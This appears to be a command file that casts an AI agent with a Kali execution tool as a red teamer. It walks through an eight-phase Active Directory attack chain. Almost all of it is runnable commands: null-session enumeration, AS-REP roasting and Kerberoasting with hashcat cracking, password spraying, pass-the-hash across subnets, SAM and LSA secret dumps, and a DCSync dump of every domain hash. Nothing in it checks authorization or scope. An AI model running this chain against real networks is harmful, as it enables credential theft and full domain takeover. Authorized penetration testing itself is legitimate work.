---
description: Active Directory attack — 8-phase chain from unauthenticated enum to DCSync (NetExec, AS-REP roasting, Kerberoasting, BloodHound, Pass-the-Hash, lateral movement)
argument-hint: <domain> <dc-ip> [username:password]
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-ad — Active Directory Attack Agent

You are a senior red teamer systematically attacking an Active Directory environment. Execute each phase in order, passing credentials forward as you crack hashes or find plaintext passwords.

**Prerequisites**: Kali must have network access to the DC. Tools required: impacket-*, netexec, bloodhound-python, hashcat. Run from Kali as root.

---

## Step 0 — Parse Arguments & Verify Tools

Parse from `$ARGUMENTS`:
- `DOMAIN` = first word (e.g. `CORP.LOCAL`)
- `DC_IP` = second word (e.g. `10.10.10.100`)
- `CREDS` = third word if present (e.g. `user:password` or `:NTLMhash`)

```bash
DOMAIN=<domain>
DC_IP=<dc_ip>
DOMAIN_SHORT=$(echo $DOMAIN | cut -d. -f1)
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)
mkdir -p $ENG/loot/ad $ENG/loot/bloodhound $ENG/loot/hashes

echo "=== pt-ad: $DOMAIN ($DC_IP) ==="
echo "Timestamp: $TS"
echo ""

# Tool availability check
echo "=== Tool Check ==="
for t in netexec impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump \
          impacket-psexec bloodhound-python hashcat ldapsearch; do
    printf "  %-30s %s\n" "$t" "$(command -v $t 2>/dev/null || which $t 2>/dev/null || echo 'NOT FOUND')"
done
echo ""

# DC reachability
echo "=== DC Reachability ==="
ping -c 2 $DC_IP 2>/dev/null | tail -2
echo "SMB: $(netexec smb $DC_IP 2>/dev/null | head -2)"
```

---

## Phase 1 — Unauthenticated Enumeration

Maximum intelligence gathering before any authentication attempt.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
DOMAIN_SHORT=$(echo $DOMAIN | cut -d. -f1)
DC_BASE=$(echo $DOMAIN | sed 's/\./,DC=/g' | sed 's/^/DC=/')

echo "=== [Phase 1] Unauthenticated Enumeration ==="

# SMB version + OS fingerprint + signing status
echo "--- SMB fingerprint ---"
netexec smb $DC_IP 2>/dev/null | head -5

# Null session SMB
echo ""
echo "--- Null session SMB shares ---"
netexec smb $DC_IP -u '' -p '' --shares 2>/dev/null | head -20
netexec smb $DC_IP -u 'anonymous' -p '' --shares 2>/dev/null | head -10

# LDAP anonymous bind
echo ""
echo "--- LDAP anonymous bind ---"
ldapsearch -x -H ldap://$DC_IP -b "$DC_BASE" \
    "(objectClass=user)" cn sAMAccountName description 2>/dev/null | \
    grep -E "^cn:|^sAMAccountName:|^description:" | head -40

# Domain info via LDAP
echo ""
echo "--- Domain controllers ---"
ldapsearch -x -H ldap://$DC_IP -b "$DC_BASE" \
    "(objectClass=organizationalUnit)" ou 2>/dev/null | grep "^ou:" | head -20

# RPC null session
echo ""
echo "--- RPC null session user enum ---"
netexec smb $DC_IP -u '' -p '' --users 2>/dev/null | head -30 | \
    tee $ENG/loot/ad/users_null.txt

# SMB relay list (for later responder attacks)
echo ""
echo "--- SMB hosts without signing (relay candidates) ---"
netexec smb $DC_IP --gen-relay-list $ENG/loot/ad/smb_relay_list.txt 2>/dev/null
wc -l $ENG/loot/ad/smb_relay_list.txt 2>/dev/null && \
    echo "  Saved relay candidates to $ENG/loot/ad/smb_relay_list.txt"
```

---

## Phase 2 — AS-REP Roasting (No Credentials Required)

Targets accounts with "Do not require Kerberos preauthentication" set.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current

echo "=== [Phase 2] AS-REP Roasting ==="

# Use collected usernames or common names
# Combine null session users with a short wordlist
cat $ENG/loot/ad/users_null.txt 2>/dev/null | grep -oE '[A-Za-z0-9._-]+\\$?[A-Za-z0-9._-]*' | \
    grep -v '^\$\|^[Aa]dministrator$' | sort -u > $ENG/loot/ad/users_to_try.txt

# Add common usernames
cat >> $ENG/loot/ad/users_to_try.txt << 'EOF'
administrator
admin
guest
krbtgt
svc_sql
svc_backup
svc_web
service
helpdesk
it
support
EOF
sort -u $ENG/loot/ad/users_to_try.txt -o $ENG/loot/ad/users_to_try.txt

echo "Testing $(wc -l < $ENG/loot/ad/users_to_try.txt) usernames for AS-REP roastability..."
echo ""

impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass \
    -usersfile $ENG/loot/ad/users_to_try.txt \
    -outputfile $ENG/loot/hashes/asrep_hashes.txt 2>/dev/null | \
    grep -v "^Impacket\|^$"

echo ""
if [ -s $ENG/loot/hashes/asrep_hashes.txt ]; then
    echo "[AS-REP HASHES FOUND] Cracking..."
    cat $ENG/loot/hashes/asrep_hashes.txt
    echo ""
    echo "Cracking with rockyou.txt (async — 2-10 minutes)..."
    nohup hashcat -m 18200 $ENG/loot/hashes/asrep_hashes.txt \
        /usr/share/wordlists/rockyou.txt \
        --outfile $ENG/loot/hashes/asrep_cracked.txt \
        -r /usr/share/hashcat/rules/best64.rule \
        --force -q > $ENG/loot/hashes/asrep_hashcat.log 2>&1 &
    echo "Hashcat PID: $! — check $ENG/loot/hashes/asrep_cracked.txt for results"
else
    echo "[no AS-REP vulnerable accounts found with tested usernames]"
fi
```

---

## Phase 3 — Password Spray (with found/default credentials)

Only after obtaining or guessing at least one credential. Careful — lockout risk.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
# Passwords to try: cracked AS-REP pass, season patterns, company name
# IMPORTANT: Check domain lockout policy first

echo "=== [Phase 3] Password Spray ==="

# Check lockout policy first
netexec smb $DC_IP -u '' -p '' --pass-pol 2>/dev/null | grep -i "lockout\|threshold\|duration"
echo ""
echo "=== Lockout policy above — proceed carefully ==="
echo ""

# If you have a user list and a password to spray:
SPRAY_PASS="<password_to_spray>"
netexec smb $DC_IP -u $ENG/loot/ad/users_to_try.txt -p "$SPRAY_PASS" \
    --continue-on-success 2>/dev/null | \
    grep "+" | tee $ENG/loot/ad/spray_hits.txt

echo ""
echo "Password spray hits: $(wc -l < $ENG/loot/ad/spray_hits.txt 2>/dev/null)"
cat $ENG/loot/ad/spray_hits.txt 2>/dev/null
```

---

## Phase 4 — Kerberoasting (Requires Valid Credentials)

Requests service tickets for SPNs — offline crack to extract service account passwords.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
USER=<valid_user>; PASS=<valid_password>

echo "=== [Phase 4] Kerberoasting ==="

impacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP \
    -outputfile $ENG/loot/hashes/kerb_hashes.txt 2>/dev/null | \
    grep -v "^Impacket\|^$"

echo ""
if [ -s $ENG/loot/hashes/kerb_hashes.txt ]; then
    echo "[KERBEROS HASHES FOUND]"
    cat $ENG/loot/hashes/kerb_hashes.txt | head -5
    echo ""
    echo "Cracking with hashcat (async)..."
    nohup hashcat -m 13100 $ENG/loot/hashes/kerb_hashes.txt \
        /usr/share/wordlists/rockyou.txt \
        --outfile $ENG/loot/hashes/kerb_cracked.txt \
        -r /usr/share/hashcat/rules/best64.rule \
        --force -q > $ENG/loot/hashes/kerb_hashcat.log 2>&1 &
    echo "Hashcat PID: $! — check $ENG/loot/hashes/kerb_cracked.txt"
else
    echo "[no Kerberoastable accounts found]"
fi
```

---

## Phase 5 — BloodHound Data Collection

Maps all AD relationships. Shows attack paths to Domain Admin visually.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
USER=<valid_user>; PASS=<valid_password>

echo "=== [Phase 5] BloodHound Collection ==="

# Ensure bloodhound-python is available
command -v bloodhound-python &>/dev/null || \
    pip3 install bloodhound 2>/dev/null

bloodhound-python \
    -u "$USER" -p "$PASS" \
    -d "$DOMAIN" -dc "$DC_IP" \
    --dns-tcp \
    -c All \
    --zip \
    -o $ENG/loot/bloodhound/ 2>/dev/null | tail -20

echo ""
echo "BloodHound data: $(ls $ENG/loot/bloodhound/*.zip 2>/dev/null | head -3)"
echo "Import to BloodHound GUI: File → Import → select the zip"
echo ""
echo "Key BloodHound queries to run:"
echo "  - 'Find Shortest Paths to Domain Admins'"
echo "  - 'Find Principals with DCSync Rights'"
echo "  - 'Find All Kerberoastable Accounts'"
echo "  - 'Find AS-REP Roastable Users'"
echo "  - 'Users with Most Local Admin Rights'"
```

---

## Phase 6 — Pass-the-Hash / Pass-the-Ticket

Use NTLM hashes directly without cracking.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
USER=<user>; NTLM_HASH=<ntlm_hash>
TARGET_RANGE=<subnet_or_ip>

echo "=== [Phase 6] Pass-the-Hash ==="

# Test hash against DC
echo "--- Validate hash against DC ---"
netexec smb $DC_IP -u "$USER" -H "$NTLM_HASH" 2>/dev/null | head -5

echo ""
echo "--- Spray hash across subnet ---"
netexec smb $TARGET_RANGE -u "$USER" -H "$NTLM_HASH" \
    --local-auth --continue-on-success 2>/dev/null | \
    grep "+" | tee $ENG/loot/ad/pth_hits.txt

echo ""
echo "PTH hits: $(wc -l < $ENG/loot/ad/pth_hits.txt 2>/dev/null)"
cat $ENG/loot/ad/pth_hits.txt 2>/dev/null

# Execute command via PTH
echo ""
echo "--- Remote execution via PTH ---"
netexec smb $DC_IP -u "$USER" -H "$NTLM_HASH" \
    -x "whoami /all" 2>/dev/null | head -10

# PsExec via PTH (gets SYSTEM shell)
echo ""
echo "--- psexec PTH test (gets SYSTEM) ---"
impacket-psexec "$DOMAIN/$USER@$DC_IP" -hashes ":$NTLM_HASH" \
    -c "whoami" 2>/dev/null | head -10
```

---

## Phase 7 — Lateral Movement

Once access to one machine is confirmed, move to others.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
USER=<user>; PASS=<password>
TARGET=<specific_target_ip>

echo "=== [Phase 7] Lateral Movement ==="

# WinRM (PowerShell Remoting)
echo "--- WinRM (PowerShell Remoting) ---"
netexec winrm $TARGET -u "$USER" -p "$PASS" \
    -x "whoami /all; hostname; ipconfig" 2>/dev/null | head -20

echo ""
echo "--- SMB file shares (data hunting) ---"
netexec smb $TARGET -u "$USER" -p "$PASS" \
    --shares 2>/dev/null | grep -i "READ\|WRITE"

# Spider for credentials/interesting files
echo ""
echo "--- Spider shares for credentials ---"
netexec smb $TARGET -u "$USER" -p "$PASS" \
    -M spider_plus --share "SYSVOL" 2>/dev/null | head -30

# WMI execution
echo ""
echo "--- WMI execution ---"
impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET" "whoami /all" 2>/dev/null | head -10

# Dump SAM from remote target (requires admin)
echo ""
echo "--- SAM dump (local accounts) ---"
netexec smb $TARGET -u "$USER" -p "$PASS" \
    --sam 2>/dev/null | head -20

# LSASS dump (requires admin, gets cached creds)
echo ""
echo "--- LSA secrets dump ---"
netexec smb $TARGET -u "$USER" -p "$PASS" \
    --lsa 2>/dev/null | head -20
```

---

## Phase 8 — DCSync (Domain Admin or Replication Rights)

Replicates all password hashes from Active Directory — equivalent to full domain compromise.

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
DA_USER=<domain_admin_user>; DA_PASS=<domain_admin_pass>

echo "=== [Phase 8] DCSync — Full Domain Credential Dump ==="

# First verify DA or replication rights
echo "--- Verify DA membership ---"
netexec smb $DC_IP -u "$DA_USER" -p "$DA_PASS" \
    --groups "Domain Admins" 2>/dev/null | head -20

echo ""
echo "--- DCSync all accounts ---"
impacket-secretsdump "$DOMAIN/$DA_USER:$DA_PASS@$DC_IP" \
    -just-dc-ntlm \
    -outputfile $ENG/loot/hashes/dcsync_hashes 2>/dev/null | \
    grep -v "^Impacket\|^$" | head -30

echo ""
echo "--- Extract high-value targets ---"
grep -iE "administrator|krbtgt|svc_|sql|backup|admin" \
    $ENG/loot/hashes/dcsync_hashes.ntds 2>/dev/null | head -20

echo ""
echo "Hashes saved: $ENG/loot/hashes/dcsync_hashes.ntds"
echo "Total hashes: $(wc -l < $ENG/loot/hashes/dcsync_hashes.ntds 2>/dev/null || echo 0)"
echo ""
echo "Golden Ticket (from krbtgt hash):"
grep "krbtgt" $ENG/loot/hashes/dcsync_hashes.ntds 2>/dev/null | head -2
```

---

## Step — Report Findings

```bash
DOMAIN=<domain>; DC_IP=<dc_ip>
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)

cat > $ENG/notes/ad_attack_$TS.md << 'AD_REPORT'
# Active Directory Attack Report
**Domain**: <domain>
**DC**: <dc_ip>
**Date**: <date>

## Attack Chain

### Phase 1 — Unauthenticated Access
[Document null session results, exposed shares, user enumeration]

### Phase 2 — Initial Foothold
[Document AS-REP roasting result, first credential obtained]

### Phase 3-4 — Privilege Escalation
[Password spray hits, Kerberoasting results]

### Phase 5 — Domain Takeover
[BloodHound attack path, DCSync result]

## Credentials Obtained
| User | Type | Hash/Password | Source |
|------|------|--------------|--------|
| | | | |

## Remediation
1. Disable null sessions: RestrictAnonymous=2
2. Enforce Kerberos preauthentication on all accounts
3. Set long random passwords on service accounts (>25 chars)
4. Enable Protected Users security group for privileged accounts
5. Enable Kerberos armoring (FAST) to prevent AS-REP roasting
6. Implement tiering model: separate DA from workstation admins
AD_REPORT

echo "Report template: $ENG/notes/ad_attack_$TS.md"
```

---

## Execution Rules

- **Phase order matters** — each phase feeds credentials into the next
- **Check lockout policy before spraying** — Phase 3 must be preceded by policy check
- **BloodHound is not optional** — even with DA, run it to document the path for the report
- **Save every hash immediately** to `$ENG/loot/hashes/` — they persist across sessions
- **Document DA membership proof** with `whoami /all` or `netexec` group check
- **DCSync = full domain compromise** — document it clearly in the report with the krbtgt hash
- **Golden ticket** — from krbtgt hash you can forge Kerberos tickets offline for persistence
- **Chain recognition**: AS-REP cracked → spray → Kerberoast → BloodHound path → DA → DCSync
